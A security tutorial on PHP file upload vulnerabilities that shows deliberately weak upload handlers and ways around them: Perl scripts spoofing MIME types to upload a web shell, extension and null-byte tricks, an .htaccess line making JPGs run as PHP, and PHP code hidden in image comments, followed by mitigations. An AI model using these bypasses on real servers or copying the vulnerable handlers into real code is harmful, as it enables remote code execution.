---
title: "Hacking File Upload Vulnerabilities"
date: 2018-01-20T21:25:57+08:00
---
Allowing an end user to upload files to your website is like opening another door for a malicious user to compromise your server. However, uploading files is a necessity for any web application with advanced functionality. Whether it is a social networking site like Facebook and Twitter, or an intranet document sharing portal, web forums and blog sites have to let users employ avatars and other tools to upload images, videos and numerous other file types.

Unfortunately, uploaded files represent a significant risk to applications. Any attacker wants to find a way to get a code onto a victim system, and then looks for a way to execute that code. Using an uploaded file upload accomplishes this first step.

There are really two different types of problems here. The first is generated from file metadata, like the path and filename. These are generally provided by the transport, such as HTTP multipart encoding. This data can be used to trick the application into overwriting a critical file or storing the file in a bad location.
For example, the attacker could upload file called "index.php" to the root folder, by uploading a malicious file and its filename might look like this: **../../../index.php**. This is why the web developer must validate the metadata extremely carefully before using it.

The other type of problem with uploaded data comes from file content. In this article, we will discuss some poor techniques that are often used to protect and process uploaded files, as well as the methods for bypassing them.

Basic Implementation Of A File Upload Form
=========================

Any file upload implementation technique simply consists of an HTML file and a PHP script file. The HTML file creates a user interface that allow the user to choose which file to upload, while the PHP script contains the code that handles the request to upload the selected file. Here is an example of implementation with a basic HTML and PHP script:

    <!-- lang: html -->
    <form enctype="multipart/form-data" action="uploader.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="100000">
    Choose a file to upload: <input name="uploadedfile" type="file"><br>
    <input type="submit" value="Upload File">
    </form>
    
    <!-- lang: php -->
    $target_path="uploads/";
    
    // We set the target path that will save the file in to.
    $target_path = $target_path.basename($_FILES['uploadedfile']['name']);
    
    // We move the desired file from the tmp directory to the target path
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'],$target_path)){
    echo "the file " . basename($_FILES['uploadedfile']['name']) . " has been uploaded! ";
    }else {
    echo "There was an error uploading the file, please try again!";
    }

In this simple example, there are no restrictions made regarding the type of files allowed for uploading. Therefore, an attacker can upload a PHP shell file with malicious code that can lead to full control of a victim server. Additionally, the uploaded file can be moved to the root directory, meaning that the attacker can access it through the Internet.

Content-type Verification
==============

The first technique web developers use to secure file upload forms is to check the MIME type any uploaded file that returns from PHP. The developer checks to see if the variable **$_FILES['uploadedfile']['type']** holds the value of the MIME type, and is equal to specific values that the developer permits users to upload. If they are equal, the file will be uploaded, if not, the user will see a custom error message.

The “content-type” in the header of the request indicates the MIME type. A malicious user can easily upload files using a script (or some other automated application) that allows the sending or tampering of HTTP POST requests. This in turn will allow him to send a fake mime-type.

For example, below is a PHP code that accepts images only. In this case, a developer checks if the MIME type is not equal to “image/gif”. Here I will show a custom error message, and if they equal, the file will be uploaded. Let’s save the following code in a file called Demo1.php:

    <!-- lang: php -->
    //Demo1.php
    if($_FILES['uploadedfile']['type'] != "image/gif") {
    echo "Sorry, only GIF images can be uploaded!";
    exit;
    }
    $uploaddir = 'uploads/';
    $uploadfile = $uploaddir . basename($_FILES['uploadedfile']['name']);
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $uploadfile)) {
    echo "The file is valid, upload successful!.n";
    } else {
    echo "File upload failed.n";
    }

In this case, if the attacker tries to upload a file called shell.php, the application will check the MIME type to see if it is: “application/x-php”. In this case, the application will show the error message.

An attacker can bypass this protection by changing the MIME type of the shell.php to “image/gif”. So when an application checks the MIME type, it seems like a gif file. The application will then upload the malicious code shell.php.

The Perl script shown below uploads a PHP shell to the server using Demo1.php:

    <!-- lang: perl -->
    #!/usr/bin/perl
    #
    use LWP;
    use HTTP::Request::Common;
    $ua = $ua = LWP::UserAgent->new;;
    $res = $ua->request(POST 'http://localhost/Demo1.php',
    Content_Type => 'form-data',
    Content => [
    userfile => ["shell.php", "shell.php", "Content-Type" =>"image/gif"],
    ],
    
    );
    print $res->as_string();

After running the perl script, we can request the uploaded file and execute shell commands on the web server:

    <!-- lang: shell -->
     curl http://localhost/uploads/shell.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

File Name Extension Verification
====================

The use of blacklists and whitelists (permitted or restricted) for file extensions can open many vulnerabilities, and there are a number of ways to bypass blacklists. Some of these methods include:

 - using extensions that are executable on the server but are not mentioned in the list (“file.php5”, “file.shtml”, “file.asa”, or “file.cer”) is the easiest way to bypass this protection.
 - by changing some letters of extension to the capital form (example: “file.aSp” or “file.PHp3”), it is possible to bypass this protection
 - using trailing spaces and/or dots at the end of the filename can sometimes cause bypassing the protection. These spaces and/or dots at the end of the filename will be removed when the file wants to be saved on the hard disk automatically. The filename can be sent to the server by using a local proxy or using a simple script (example: “file.asp ... ... . . .. ..”, “file.asp ”, or “file.asp.”).
 - this protection can be completely bypassed by using the most famous control character which is Null character (0x00) after the forbidden extension and before the permitted one. In this method, during the saving process all the strings after the Null character will be discarded. Putting a Null character in the filename can be simply done by using a local proxy or by using a script (example: “file.asp%00.jpg”). Besides, it would be perfect if the Null character is inserted directly by using the Hex view option of a local proxy such as Burpsuite or Webscarab in the right place (without using %).

The largest drawback to using a blacklist of file extensions is that it is almost impossible to create a list that includes all possible extensions that an attacker can use. For example, if the code is running in a hosted environment, such environments usually allow for use of a large number of scripting languages including Perl, Python, Ruby, etc. The list can be endless. 

Likewise, the use of a whilelist to define permitted extensions should be reviewed, as it could contain malicious extensions as well. For instance, in case of “.shtml” extensions in the list, the application would be vulnerable to SSI attacks.

In the following scenario, a web developer will encounter a file upload form that uses a blacklist approach. So the developer will create a list of dangerous extensions, and access will be denied if the extension of the file being uploaded is on the list.

First Attack Method
==========

The first method is to upload a .htaccess file. A malicious user can successfully run a PHP shell code if he successfully uploads a file called .htaccess, which contains a line of code similar to this:

     AddType application/x-httpd-php .jpg

The above line of code instructs an Apache web server to execute jpg images as if they were PHP scripts. The attacker can now upload a file with a jpg extension, which contains PHP code. As seen in the screen shot below, the act of requesting a jpg file (which includes the PHP shell code that takes “cmd” parameter) can be used to execute a command on the system.

Second Attack Method
==============

The second method consists in using some features of Apache.

In this technique, the developer extracts the file extension by looking for the ‘.’ character in the filename, and extracting the string after the dot character. This method for bypassing blacklisting is both simple and realistic, so let’s have a look at how Apache handles files with multiple extensions. The Apache manual states:

> Files can have more than one extension, and the order of the extensions is normally irrelevant. For example, if the file welcome.html.fr maps onto content type text/html and language French then the file welcome.fr.html will map onto exactly the same information. If more than one extension is given which maps onto the same type of meta-information, then the one to the right will be used, except for languages and content encodings. For example, if .gif maps to the MIME-type image/gif and .html maps to the MIME-type text/html, then the file welcome.gif.html will be associated with the MIME-type text/html.

Based on the previous quote we know that if we create a file called “shell.php.blah”, this file will be interpreted and executed as a PHP file. This only works because the last extension wasn’t specified on the list of MIME-types known to the web server. So the web server will execute the MIME-types that it can recognize, which, in this case, is PHP as mentioned earlier in the quote.

Third Attack Method

We can make a blacklist of file extensions, and check the file names specified by the user to make sure that they do not have any of the bad extensions that are already known. Here is the Demo2.php:

    <!-- lang: php -->
    $blacklist = array(".php","html","shtml",".phtml", ".php3", ".php4");
    foreach ($blacklist as $item) {
        if(preg_match("/$item$/", $_FILES['uploadedfile']['name'])) {
            echo "We do not allow uploading PHP filesn";
            exit;
        }
    }
    $uploaddir = 'uploads/';
    $uploadfile = $uploaddir . basename($_FILES['uploadedfile']['name']);
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $uploadfile)) {
        echo "File is valid, and was successfully uploaded.n";
    } else {
        echo "File uploading failed.n";
    }

You can bypass this simply by changing the extension from “.php” to “.PHP”. The method is really basic, in that code we just search for the lowercase of “php”. So the developer must change (**$_FILES['uploadedfile']['name']**) to lowercase, and then search for the extensions OR use “/i” that makes the regex match case insensitive.

The Perl script shown below uploads a PHP shell to the server using Demo2.php:

    <!-- lang: perl -->
    #!/usr/bin/perl
    #
    use LWP;
    use HTTP::Request::Common;
    $ua = $ua = LWP::UserAgent->new;;
    $res = $ua->request(POST 'http://localhost/Demo2.php',
    Content_Type => 'form-data',
    Content => [
    userfile => ["shell.PHP", "shell.PHP", "Content-Type" =>"image/gif"],
    ],
    );
    print $res->as_string();

Image File Content Verification
====================

A developer typically checks if the function returns a true or false and validates any uploaded file using this information. So if a malicious user tries to upload a simple PHP shell embedded in a jpg file, the function will return false, and he won’t be allowed to upload the file. However, even this approach can be easily bypassed. If a picture is opened in an image editor, like Gimp, one can edit the image comment, where PHP code is inserted, as shown below. When the developer permits uploading images only, the developers use the `getimagesize()` function to validate the image header. The `getimagesize()` function takes a file name as an argument and returns the size of the image if it’s true, and relays the indication false if the argument has failed. So if the attacker can inject the PHP shell code to an image, the header of this image will be corrupted so that the function will fail and the function will return as false. He won’t be allowed to upload the shell script to the remote server. Unfortunately, attackers have founded ways to bypass this technique too. Attackers can use an image editor, like Gimp, to edit the image comment and insert a php shell script there. Consider Demo3.php below:

    <!-- lang: php -->
    $imageinfo = getimagesize($_FILES['uploadedfile']['tmp_name']);
    if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg') {
        echo "Sorry, we only accept GIF and JPEG imagesn";
        exit;
     }
    $uploaddir = 'uploads/';
    $uploadfile = $uploaddir . basename($_FILES['uploadedfile']['name']);
    if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $uploadfile)) {
        echo "File is valid, and was successfully uploaded.n";
    } else {
        echo "File uploading failed.n";
    }

Now even if the attacker sets the content-type header to “image/gif” after trying to upload shell.php, Demo3.php won’t accept it anymore. Instead, we will embed the php shell script in the comment section. When the PHP interpreter looks at the file, it sees the executable PHP code inside of some binary garbage.

Now let’s upload the image through web browser or through the following perl script:

    <!-- lang: perl -->
    #!/usr/bin/perl
    #
    use LWP;
    use HTTP::Request::Common;
    $ua = $ua = LWP::UserAgent->new;;
    $res = $ua->request(POST 'http://localhost/Demo3.php',
    Content_Type => 'form-data',
    Content => [
    userfile => ["chelsea-logo.jpg", "chelsea-logo.jpg", "Content-Type" =>
    "image/jpg"],
    ],
    );
    print $res->as_string();

Now the attacker can request: uploads/chelsea-logo.jpg.

Mitigation
=======

Here are some solutions that will help you secure your file upload process. Overall however, you must be aware that the more functionalities you provide to the user, the more chances to compromise your server—so don’t implement any functionality that you don’t really need it.

 - Define a .htaccess file that will only allow access to files with allowed extensions.
 - Do not place the .htaccess file in the same directory where the uploaded files will be stored. It should be placed in the parent directory.
 - The most important thing is to keep uploaded files in a location that can’t access though the Internet. This can be done either by storing uploaded files outside of the web root or configuring the web server to deny access to the uploads directory.
 - Create a white list for accepting MIME types. NEVER use a blacklist technique.
 - Generate a random file name so even if the attacker uploads a malicious PHP code, he will encounter problems trying to determine the name of the file in the uploaded folder.

Conclusion
======

A developer must be careful not to expose applications to attack while implementing file upload functionalities because poorly designed tools for file upload implementation can lead to vulnerabilities such as remote code execution.
